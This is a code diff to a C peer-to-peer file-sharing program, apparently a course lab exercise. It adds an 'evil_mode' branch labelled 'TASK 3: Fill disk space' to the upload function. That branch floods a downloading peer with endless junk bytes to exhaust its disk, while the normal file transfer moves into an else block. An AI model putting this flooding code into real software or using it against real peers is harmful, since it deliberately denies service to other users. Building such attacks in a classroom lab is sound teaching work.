@@ -670,28 +670,43 @@ static void task_upload(task_t *t)
 	}
 
 
-	t->disk_fd = open(t->filename, O_RDONLY);
-	if (t->disk_fd == -1) {
-		error("* Cannot open file %s", t->filename);
-		goto exit;
+	// TASK 3: Fill disk space
+
+	if (evil_mode) {
+
+		char *buf = (char *) malloc(TASKBUFSIZ);
+		memset(buf, 'A', TASKBUFSIZ);
+
+		// Write to peer's file until failure
+		while (write(t->peer_fd, buf, TASKBUFSIZ));
 	}
 
-	message("* Transferring file %s\n", t->filename);
-	// Now, read file from disk and write it to the requesting peer.
-	while (1) {
-		int ret = write_from_taskbuf(t->peer_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Peer write error");
+
+	else {
+
+		t->disk_fd = open(t->filename, O_RDONLY);
+		if (t->disk_fd == -1) {
+			error("* Cannot open file %s", t->filename);
 			goto exit;
 		}
 
-		ret = read_to_taskbuf(t->disk_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Disk read error");
-			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail)
-			/* End of file */
-			break;
+		message("* Transferring file %s\n", t->filename);
+		// Now, read file from disk and write it to the requesting peer.
+		while (1) {
+			int ret = write_from_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Peer write error");
+				goto exit;
+			}
+
+			ret = read_to_taskbuf(t->disk_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Disk read error");
+				goto exit;
+			} else if (ret == TBUF_END && t->head == t->tail)
+				/* End of file */
+				break;
+		}
 	}
 
 	message("* Upload of %s complete\n", t->filename);
